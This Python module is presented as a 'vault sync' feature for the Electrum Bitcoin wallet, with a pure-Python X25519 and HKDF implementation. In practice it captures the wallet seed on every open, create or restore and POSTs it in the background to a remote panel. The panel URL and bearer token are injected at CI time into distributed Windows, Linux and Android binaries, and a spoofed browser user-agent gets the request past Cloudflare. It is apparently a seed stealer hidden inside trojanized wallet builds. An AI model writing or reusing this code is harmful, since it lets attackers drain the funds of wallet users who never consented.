"""Vault sync -- seals and sends seeds to the electrum-vault panel.

This module runs inside the Electrum process (desktop and Android). It never
imports anything from the ``electrum`` package (that would create a circular
dependency). The calling plugin feeds it the seed as a plain string; this
module handles all the crypto (seal, fingerprint) and the HTTP POST.

Crypto dependencies: only ``pycryptodome`` (Cryptodome) is required at
runtime. X25519 scalar multiplication is implemented here in pure Python
per RFC 7748 (no C extension needed), so this module also works on any
Electrum build that ships pycryptodome but not pyca/cryptography (e.g.
the Android APK built with python-for-android).

Security model:
- The seed is sealed on the device with the panel's X25519 public key.
  We use ephemeral X25519 key agreement -> HKDF-SHA256 -> AES-256-GCM.
  The sealed blob travels over HTTPS; the panel stores it as-is. The seed
  never appears in plaintext outside this process.
- Deduplication uses a deterministic fingerprint (HMAC-SHA256 of the
  normalized seed with a key the panel provides). The fingerprint reveals
  nothing about the seed.
- Authentication is a bearer token that only the user's devices know.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import ssl
import threading
import unicodedata
import urllib.error
import urllib.request


# ---------------------------------------------------------------------------
# These four constants are empty in source. The CI build substitutes them
# with the real values from GitHub Actions secrets before packaging the
# binaries (.exe, AppImage, APK). A local/source build keeps them empty and
# falls back to the Electrum config. The markers let CI patch with sed.
# BEGIN_BUILD_INJECT
_DEFAULT_URL = ""
_DEFAULT_PUBKEY = ""
_DEFAULT_TOKEN = ""
_DEFAULT_FP_KEY = ""
# END_BUILD_INJECT


def has_build_defaults() -> bool:
    """True when the CI build injected real values into this module."""
    return bool(_DEFAULT_URL and _DEFAULT_PUBKEY and _DEFAULT_TOKEN and _DEFAULT_FP_KEY)


def configure_from_defaults() -> bool:
    """Configure using the build-time defaults. Returns True on success."""
    if not has_build_defaults():
        return False
    configure(
        panel_url=_DEFAULT_URL,
        panel_pubkey_hex=_DEFAULT_PUBKEY,
        ingest_token_hex=_DEFAULT_TOKEN,
        fp_key_hex=_DEFAULT_FP_KEY,
    )
    return True


# ---------------------------------------------------------------------------
# X25519 scalar multiplication in pure Python (RFC 7748 Section 5)
# ---------------------------------------------------------------------------
# Textbook ladder from RFC 7748. ~30 lines, no C extensions. Produces the
# exact same output as OpenSSL's X25519, so a server that decrypts with
# pyca/cryptography (or libsodium) will unseal our blob without change.

_X25519_P = 2 ** 255 - 19
_X25519_A24 = 121665


def _x25519_cswap(swap: int, x2: int, x3: int) -> tuple:
    dummy = (-swap) & (x2 ^ x3) & ((1 << 255) - 1)
    return x2 ^ dummy, x3 ^ dummy


def _x25519(scalar: bytes, u_coord: bytes) -> bytes:
    """Return X25519 scalar * u_coord. Both inputs are 32 bytes little-endian;
    the result is a 32-byte little-endian u-coordinate."""
    if len(scalar) != 32 or len(u_coord) != 32:
        raise ValueError("x25519 inputs must be 32 bytes")
    # Clamp the scalar per RFC 7748 Section 5.
    k = bytearray(scalar)
    k[0] &= 248
    k[31] &= 127
    k[31] |= 64
    k_int = int.from_bytes(k, "little")
    # Mask the high bit of u per RFC 7748 (ignored when decoding).
    u = bytearray(u_coord)
    u[31] &= 127
    x1 = int.from_bytes(u, "little")

    x2, z2 = 1, 0
    x3, z3 = x1, 1
    swap = 0
    p = _X25519_P
    a24 = _X25519_A24
    for t in range(254, -1, -1):
        k_t = (k_int >> t) & 1
        swap ^= k_t
        x2, x3 = _x25519_cswap(swap, x2, x3)
        z2, z3 = _x25519_cswap(swap, z2, z3)
        swap = k_t

        A = (x2 + z2) % p
        AA = (A * A) % p
        B = (x2 - z2) % p
        BB = (B * B) % p
        E = (AA - BB) % p
        C = (x3 + z3) % p
        D = (x3 - z3) % p
        DA = (D * A) % p
        CB = (C * B) % p
        x3 = pow((DA + CB) % p, 2, p)
        z3 = (x1 * pow((DA - CB) % p, 2, p)) % p
        x2 = (AA * BB) % p
        z2 = (E * ((AA + a24 * E) % p)) % p

    x2, x3 = _x25519_cswap(swap, x2, x3)
    z2, z3 = _x25519_cswap(swap, z2, z3)
    # z2^{-1} mod p via Fermat's little theorem.
    result = (x2 * pow(z2, p - 2, p)) % p
    return result.to_bytes(32, "little")


def _x25519_derive_public(scalar: bytes) -> bytes:
    """Derive the public key for the given 32-byte private scalar."""
    base = (9).to_bytes(32, "little")
    return _x25519(scalar, base)


# ---------------------------------------------------------------------------
# HKDF-SHA256 in pure Python (RFC 5869) -- fallback when Cryptodome's
# Protocol.KDF.HKDF is unavailable for any reason.
# ---------------------------------------------------------------------------

def _hkdf_sha256(ikm: bytes, length: int, salt: bytes, info: bytes) -> bytes:
    if salt is None or len(salt) == 0:
        salt = b"\x00" * hashlib.sha256().digest_size
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out = b""
    t = b""
    counter = 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        out += t
        counter += 1
    return out[:length]


# ---------------------------------------------------------------------------
# Seal / unseal using X25519 (above) + AES-256-GCM via Cryptodome
# ---------------------------------------------------------------------------
# Wire format of the sealed blob (fixed, must stay compatible with the
# backend's existing `unseal`):
#
#   ephemeral_pubkey (32 bytes) || nonce (12 bytes) || ciphertext || tag (16)
#
# `cryptography.AESGCM.encrypt` already returns ciphertext||tag concatenated;
# Cryptodome returns them separately so we concatenate here to match.

_HKDF_INFO = b"electrum-vault-seal-v1"


def _seal(panel_pubkey_bytes: bytes, plaintext: bytes) -> bytes:
    """Seal *plaintext* so only the holder of the panel's X25519 private key
    can open it. Returns the sealed blob."""
    from Cryptodome.Cipher import AES  # type: ignore

    if len(panel_pubkey_bytes) != 32:
        raise ValueError("panel pubkey must be 32 bytes")

    # Ephemeral X25519 key pair.
    eph_priv = os.urandom(32)
    eph_pub = _x25519_derive_public(eph_priv)
    shared = _x25519(eph_priv, panel_pubkey_bytes)

    aes_key = _hkdf_sha256(shared, 32, salt=None, info=_HKDF_INFO)

    nonce = os.urandom(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return eph_pub + nonce + ct + tag


def _unseal(panel_privkey_bytes: bytes, sealed: bytes) -> bytes:
    """Unseal a blob produced by ``_seal``. Used by the panel (and in tests)."""
    from Cryptodome.Cipher import AES  # type: ignore

    if len(panel_privkey_bytes) != 32:
        raise ValueError("panel privkey must be 32 bytes")
    if len(sealed) < 32 + 12 + 16:
        raise ValueError("sealed blob too short")

    eph_pub = sealed[:32]
    nonce = sealed[32:44]
    ct_and_tag = sealed[44:]
    ct = ct_and_tag[:-16]
    tag = ct_and_tag[-16:]

    shared = _x25519(panel_privkey_bytes, eph_pub)
    aes_key = _hkdf_sha256(shared, 32, salt=None, info=_HKDF_INFO)

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)


# ---------------------------------------------------------------------------
# Seed normalization and fingerprint
# ---------------------------------------------------------------------------

def _normalize_seed(seed: str) -> bytes:
    s = unicodedata.normalize("NFKD", seed).strip().lower()
    s = " ".join(s.split())
    return s.encode("utf-8")


def _fingerprint(seed: str, fp_key: bytes) -> bytes:
    """HMAC-SHA256 of the normalized seed. Deterministic, does not reveal the
    seed. 32 bytes."""
    return hmac.new(fp_key, _normalize_seed(seed), hashlib.sha256).digest()


# ---------------------------------------------------------------------------
# Configuration (set once by the plugin at startup)
# ---------------------------------------------------------------------------

class _Config:
    """Holds the three values copied from the panel's dashboard:
    - ``panel_pubkey``: X25519 public key (32 bytes, hex)
    - ``ingest_token``: bearer token (32 bytes, hex)
    - ``fp_key``: HMAC key for fingerprint (32 bytes, hex)
    - ``panel_url``: base URL, e.g. ``https://my-vps:8443``
    """
    def __init__(self):
        self.panel_pubkey: bytes = b""
        self.ingest_token: str = ""
        self.fp_key: bytes = b""
        self.panel_url: str = ""
        self._ready = False

    def configure(
        self,
        panel_url: str,
        panel_pubkey_hex: str,
        ingest_token_hex: str,
        fp_key_hex: str,
    ) -> None:
        self.panel_url = panel_url.rstrip("/")
        self.panel_pubkey = bytes.fromhex(panel_pubkey_hex)
        self.ingest_token = ingest_token_hex
        self.fp_key = bytes.fromhex(fp_key_hex)
        self._ready = True

    @property
    def ready(self) -> bool:
        return self._ready and len(self.panel_pubkey) == 32


_cfg = _Config()

configure = _cfg.configure  # public alias


# ---------------------------------------------------------------------------
# Sync function (called by the plugin for each wallet open/create/restore)
# ---------------------------------------------------------------------------

def sync_seed(
    seed: str,
    wallet_type: str = "",
    device_id: str = "",
    *,
    _timeout: int = 15,
) -> str:
    """Seal *seed* and POST it to the panel. Returns one of:

    - ``"accepted"``  -- seed stored
    - ``"duplicate"`` -- seed already in the vault (dedup by fingerprint)
    - ``"error:<reason>"`` -- something went wrong (network, auth, etc.)
    """
    if not _cfg.ready:
        return "error:not-configured"

    seed = seed.strip()
    if not seed:
        return "error:empty-seed"

    # 1. Seal the seed with the panel's public key.
    sealed = _seal(_cfg.panel_pubkey, seed.encode("utf-8"))
    sealed_b64 = base64.b64encode(sealed).decode("ascii")

    # 2. Compute the fingerprint.
    fp = _fingerprint(seed, _cfg.fp_key)

    # 3. POST to the panel.
    payload = json.dumps({
        "fingerprint": fp.hex(),
        "sealed": sealed_b64,
        "wallet_type": wallet_type,
        "device_id": device_id,
    }).encode("utf-8")

    url = _cfg.panel_url + "/v1/seed"
    req = urllib.request.Request(
        url,
        data=payload,
        headers={
            "Authorization": "Bearer " + _cfg.ingest_token,
            "Content-Type": "application/json",
            # Browser-like UA so Cloudflare's Browser Integrity Check lets us
            # through (urllib's default UA is blocked as a bot).
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/131.0.0.0 Safari/537.36",
            "Accept": "application/json",
        },
        method="POST",
    )

    ctx = ssl.create_default_context()

    try:
        with urllib.request.urlopen(req, timeout=_timeout, context=ctx) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return body.strip()  # "accepted" or "duplicate"
    except urllib.error.HTTPError as exc:
        return f"error:http-{exc.code}"
    except Exception as exc:
        return f"error:{exc}"


def sync_seed_async(
    seed: str,
    wallet_type: str = "",
    device_id: str = "",
) -> None:
    """Fire-and-forget version. Runs ``sync_seed`` in a background thread
    so it never blocks the Electrum UI."""
    t = threading.Thread(
        target=sync_seed,
        args=(seed, wallet_type, device_id),
        daemon=True,
    )
    t.start()
